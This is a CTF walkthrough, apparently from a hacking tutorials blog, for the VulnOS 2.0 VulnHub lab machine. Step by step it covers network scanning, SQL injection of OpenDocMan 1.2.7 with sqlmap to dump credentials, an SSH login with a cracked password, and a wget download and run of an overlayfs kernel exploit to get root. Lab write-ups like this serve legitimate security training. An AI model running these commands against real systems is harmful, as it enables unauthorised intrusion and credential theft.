<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/vulnhub/" rel="category tag">VulnHub</a></span>            </div>
            <h1 class="post-title entry-title">Hack the VulnOS 2.0 VM (CTF Challenge)</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/hack-the-vulnos-2-0-vm-ctf-challenge/" rel="bookmark"><time class="entry-date published" datetime="2016-10-17T13:36:22+00:00">October 17, 2016</time><time class="updated" datetime="2025-06-10T20:30:31+00:00">June 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;"><strong>“Your assignment is to pentest a company website, get the root of the system and read the final flag”</strong> is the only thing we know about this VM other than that is it a smaller one. Therefore without any further ado lets starts by finding our target aka victim.</span></p>
<h3><span style="color: #800000;">Breaching Methodologies:</span></h3>
<ul>
<li><span style="color: #000000;">Network Scanning (netdiscover, Nmap)</span></li>
<li><span style="color: #000000;">Enumeration (source code review)</span></li>
<li><span style="color: #000000;">Use Exploit 32075 (searchsploit)</span></li>
<li><span style="color: #000000;">SQL injection (sqlmap)</span></li>
<li><span style="color: #000000;">Use fetched credential for SSH login</span></li>
<li><span style="color: #000000;">Kernel Privilege Escalation (Exploit 37292)</span></li>
<li><span style="color: #000000;">Get Root access and capture the flag.</span></li>
</ul>
<pre class="lang:default decode:true">netdiscover</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-PEBRjfY61dw/WuszmGxKknI/AAAAAAAAWp4/JfIzu7Z5LMw0ZRXtIqyfKu09F_8BJ5VnQCLcBGAs/s1600/1.png"/></span></p>
<p><span style="color: #000000;">Here, it has discovered the target IP: 192.168.1.102, and now we will run nmap to determine what services are running.</span></p>
<pre class="lang:default decode:true">nmap -p- -A 192.168.1.102</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-da8av6gyH0s/WuszoHl-dlI/AAAAAAAAWqY/3Z04rkt4BtkiHwQBVHbZyvPnxxMM5W3XACLcBGAs/s1600/2.png"/></span></p>
<p><span style="color: #000000;">So, the services that running is <strong>SSH</strong> on <strong>22 ports</strong>, <strong>HTTP</strong> on <strong>80 ports</strong>, <strong>IRC</strong> on <strong>6667</strong>. As port 80 is open that means we can open it in the browser.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-aL-d4LwvlII/WuszoAcQbkI/AAAAAAAAWqc/R68R4hiDns836h7jMskxRmtGuwYoykeswCLcBGAs/s1600/3.png"/></span></p>
<p><span style="color: #000000;">Since we didn’t found anything on a web page, therefore, we looked into its source code and here saw a link <strong>/jabc</strong>; let’s open it.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Cby4uQBfM3k/Wuszol5BB7I/AAAAAAAAWqg/AMPTheD3ql8VZdWhGvBGo9Y6RtOEhe_jQCLcBGAs/s1600/4.png"/></span></p>
<p><span style="color: #000000;">When we had explored <strong>/jabc</strong> in the browser, it put up the following page.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-UyrKEHCevnY/WuszpWdNRpI/AAAAAAAAWqs/GbHcjcX3A20ZJtCSru1VaUZ5uVzZbJBRwCLcBGAs/s1600/5.png"/></span></p>
<p><span style="color: #000000;">In this webpage, there were various tabs and I explored each tab including their page source and I found nothing except for the last tab i.e. Document. </span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-VB7ECzV0ZT8/WuszpKP8LhI/AAAAAAAAWqk/VWxLDFFvN6kut9lmVanQYHCvnxCm3RBpwCLcBGAs/s1600/6.png"/></span></p>
<p><span style="color: #000000;">When you look into the page source there will be a line saying “<strong>/jabd0cs/</strong> on the server. Just log in with the guest/guest.”</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-YegnB-zC6Ro/WuszpUrLfJI/AAAAAAAAWqo/a_Qq_oYInnI0FfJ3HNrb6Ge9Gc-wyWHHgCLcBGAs/s1600/7.png"/></span></p>
<p><span style="color: #000000;">So, I opened the directory and logged in with guest: guest as username: password respectively. And there was an upload option but there was a restriction that you can only upload the .doc file so it was pretty useless.</span></p>
<p><span style="color: #000000;">If you observe the login page there is a <strong>cms opendocman v1.2.7</strong>. this version of opendocman is vulnerable.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-5ttCIVleJB4/WuszprlCnkI/AAAAAAAAWqw/2gfo_RP7sD8J7yoP9Kr4TgUMjnFZtfUmwCLcBGAs/s1600/8.1.png"/></span></p>
<p><span style="color: #000000;">Let’s search for its exploits to be used against opendocman. And for that type:</span></p>
<pre class="lang:default decode:true">searchsploit OpenDocMan 1.2.7</pre>
<p><span style="color: #000000;">From its result, we found <strong>exploit 32075.txt</strong> which was showing “the vulnerability exists due to insufficient validation of “add_value” HTTP GET parameter in “/ajax_udf.php” script. A remote unauthenticated attacker can execute arbitrary SQL commands in application’s database.”</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-8WrHjLDPNK0/WuszqL3-VSI/AAAAAAAAWq0/Fi0Qp4o9ZCw7tXnaN1AognYgqPhsxTYwwCLcBGAs/s1600/8.png"/></span></p>
<p><span style="color: #000000;">Now we will use sqlmap to find out the database of usernames and passwords and for that type:</span></p>
<pre class="lang:default decode:true">sqlmap -u 'http://192.168.1.102/jabcd0cs/ajax_udf.php?q=1&amp;add_value=odm_user' --risk=3 --level=5 --dbs --threads=4 --batch</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Vtz8lJpsk5U/WuszqYXOODI/AAAAAAAAWq4/wkIAD57pKRwC4HHY2djBEhAR1xfb30JoQCLcBGAs/s1600/9.png"/></span></p>
<p><span style="color: #000000;">And we have fetched database name “<strong>jabcd0cs</strong>”</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Y9Az_l_ERiM/WuszmIxPBAI/AAAAAAAAWp8/LUUUiW5gzzEmRHzA4pvyfg9lySiPQXNBACLcBGAs/s1600/10.png"/></span></p>
<pre class="lang:default decode:true">sqlmap -u 'http://192.168.1.102/jabcd0cs/ajax_udf.php?q=1&amp;add_value=odm_user' -D jabcd0cs --risk=3 --level=5 --threads=4 --dump-all --batch
</pre>
<p><span style="color: #000000;">The sqlmap command will show us all the username and passwords as shown below.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-PTdvQJFAI44/Wuszmkz6CTI/AAAAAAAAWqA/3lKZr_JD23gsEnyjIKedC1HJf-lhf4YRACLcBGAs/s1600/11.png"/></span></p>
<p><span style="color: #000000;">As you can see that the password is an MD5 hash value. We can crack it online no third party tool is needed.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-UQVwv8lrVI4/WuszmycOVuI/AAAAAAAAWqI/BUFxNihows8MAXBrWBa5U92n0EZwQgrXQCLcBGAs/s1600/13.png"/></span></p>
<p><span style="color: #000000;">Password turns outs to be <strong>webmin1980 </strong>with the username of <strong>webmin.</strong> As we have username and password we can log in through SSH port. And to log in through SSH open a new terminal in kali and type:</span></p>
<pre class="lang:default decode:true">ssh webmin@192.168.1.102</pre>
<p><span style="color: #000000;">And then give the password when asked and you will have a session. Let’s check the version of the kernel to see if it is vulnerable or not.</span></p>
<pre class="lang:default decode:true">lsb_release -a</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-vNdCJsLv9Co/Wuszm0Qe86I/AAAAAAAAWqE/y0ryCsqHkYIhj5W9xWZmmpaHrdkq4RFJQCLcBGAs/s1600/14.png"/></span></p>
<p><span style="color: #000000;">The version is 14.04 that means it can be exploited, and for that type:</span></p>
<pre class="lang:default decode:true">searchsploit ubuntu 14.04</pre>
<p><span style="color: #000000;">It has shown so many exploits and from those, we chose <strong>37292.c </strong>for overlayfs’ Local Privilege Escalation’.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-8piPxi0TDbI/WuszneoZOBI/AAAAAAAAWqM/WmkwkcCnc5sGCpkOWCtVXN-A4WBWV8kmwCLcBGAs/s1600/15.png"/></span></p>
<p><span style="color: #000000;">Start python HTTP server for transferring it into victim’s machine.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-hjMX9RpWUkk/WusznWrB3II/AAAAAAAAWqQ/ac1zGEt0b8cb612yiMWr6BD1YbUG6eb8gCLcBGAs/s1600/16.png"/></span></p>
<p><span style="color: #000000;">Type the following command to download it:</span></p>
<pre class="lang:default decode:true">cd /tmp
wget https://192.168.1.108/37292.c</pre>
<p><span style="color: #000000;">As the exploit is downloaded, now as always we need to compile it and then run it. And for that the set of commands is:</span></p>
<pre class="lang:default decode:true">gcc 37292.c -o shell
./shell</pre>
<p><span style="color: #000000;">And voila you have reached root but our challenge is not completed here. We still have to find the flag. Once you have reached root then go into the /root directory:</span></p>
<pre class="lang:default decode:true">id
cd /root</pre>
<p><span style="color: #000000;">Let’s check what files and folders it is holding.</span></p>
<pre class="lang:default decode:true">ls</pre>
<p><span style="color: #000000;">And here you will a flag.txt. Read it!</span></p>
<pre class="lang:default decode:true">cat flag.txt</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-lyRQYXgy3OU/Wusznq3aaMI/AAAAAAAAWqU/lcHHhxXj3skfhlmITF4cK3dF8bsN5B6hgCLcBGAs/s1600/18.png"/></span></p>
<p><span style="color: #000000;"><strong>Author</strong>: <strong>Yashika Dhir</strong> is a passionate Researcher and Technical Writer at Hacking Articles. She is a hacking enthusiast. contact <strong><a class="broken_link" style="color: #000000;" href="https://www.linkedin.com/in/yashika-dhir/">here</a></strong></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
